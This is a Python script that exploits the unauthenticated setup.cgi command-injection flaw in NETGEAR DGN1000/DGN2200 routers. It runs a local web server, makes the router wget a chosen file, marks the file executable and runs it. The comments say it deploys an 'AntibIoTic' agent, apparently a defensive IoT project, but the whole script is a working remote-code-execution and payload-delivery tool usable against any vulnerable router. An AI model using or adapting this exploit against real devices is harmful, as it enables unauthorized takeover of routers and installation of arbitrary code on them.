import sys
import urllib.request
import http.server
import socketserver
import threading
import argparse
#from pathlib import Path
import os.path
import time

"""
This script makes it easier to upload and execute files on the router NETGEAR DGN1000/DGN2200.
See https://www.exploit-db.com/exploits/25978/ for more information on the vulnerability used to run commands on the router.
"""


class Server(threading.Thread):
    def __init__(self, port):
        threading.Thread.__init__(self, daemon=True)
        self.port = port
        self.httpd = None

    def run(self):
        self.httpd = socketserver.TCPServer(
            ("", self.port),
            http.server.SimpleHTTPRequestHandler,
            bind_and_activate=False
        )
        self.httpd.allow_reuse_address = True
        self.httpd.server_bind()
        self.httpd.server_activate()
        self.httpd.serve_forever()

    def stop(self):
        if self.httpd:
            self.httpd.shutdown()
            self.httpd.server_close()


def run_command(cmd):
    print("[{}] > Running '{}'".format(args.remote_ip, cmd))
    r = urllib.request.urlopen(
        "http://{}/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd={}"
        "&curpath=/&currentsetting.htm=1".format(
            args.remote_ip, urllib.parse.quote(cmd)
        )
    )
    for line in r.readlines():
        print(line.decode('utf-8', 'ignore'))
    print()

if __name__ == '__main__':

    # Parse command line arguments
    parser = argparse.ArgumentParser(formatter_class=argparse.ArgumentDefaultsHelpFormatter)
    parser.add_argument("-s", "--server-ip", default="192.168.0.2", help="AntibIoTic gateway IP address")
    parser.add_argument("-r", "--remote-ip", default="192.168.0.1", help="Router IP address")
    parser.add_argument("-l", "--local-ip", default="192.168.0.2", help="This computers IP address")
    parser.add_argument("-p", "--port", type=int, default=8765, help="Port local server serving file is using")
    parser.add_argument("-f", "--file", required=True, help="File to upload (relative path from the cwd)")
    parser.add_argument("-n", "--name", default="upload", help="Filename after upload")
    parser.add_argument("-e", "--executable", action="store_true", default=False, help="Should file be marked as executable after upload")
    parser.add_argument("-x", "--run", action="store_true", default=False, help="Should file be run after upload with default input parameters")
    parser.add_argument("-nx", "--run-no-par", action="store_true", default=False, help="Should file be run after upload without input parameters")
    args = parser.parse_args()

    # Check path
    #filepath = Path(args.file)
    #if (!filepath.is_file()):
    if not os.path.isfile(args.file):
        print("[Local] > File '{}' not found.".format(args.file))
        sys.exit()

    print("[Local] > File to upload: '{}'".format(args.file))
    
    # Start webserver serving the files in the current dictionary
    print("[Local] > Server listening on port {} and serving the folder '{}'".format(args.port, os.getcwd()))
    server = Server(args.port)
    server.start()

    # Run command on router to download file from webserver
    run_command("wget -O /tmp/{} http://{}:{}/{}".format(args.name, args.local_ip, args.port, args.file))
    
    # Sleep to make sure the wget is finished before stopping the webserver
    time.sleep(3);
    # Stop webserver
    print("[Local] > Stopping server.")
    server.stop()
    server.join()

    if args.executable:
        # Mark downloaded file executable
        run_command("chmod +x /tmp/{}".format(args.name))
        if args.run:
            # Execute downloaded file
            run_command("./tmp/{} {} 1".format(args.name, args.server_ip)) 
            # Executed AntibIoTic Agent with Gateway IP = args.server_ip and device ID = 1 
        elif args.run_no_par:
            # Execute file with no input parameters
            run_command("./tmp/{}".format(args.name))
